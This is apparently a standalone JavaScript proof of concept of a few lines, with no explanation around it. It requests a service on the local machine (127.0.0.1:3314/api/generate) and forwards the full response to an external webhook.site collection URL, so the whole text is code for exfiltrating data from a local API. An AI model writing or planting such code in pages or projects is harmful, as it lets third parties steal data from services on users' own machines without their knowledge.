fetch('http://127.0.0.1:3314/api/generate')
  .then(response => response.text())
  .then(data => {
    fetch(`https://webhook.site/f2911ad9-1391-4bab-8584-0a6484b8c73d?response=${encodeURIComponent(data)}`);
  });
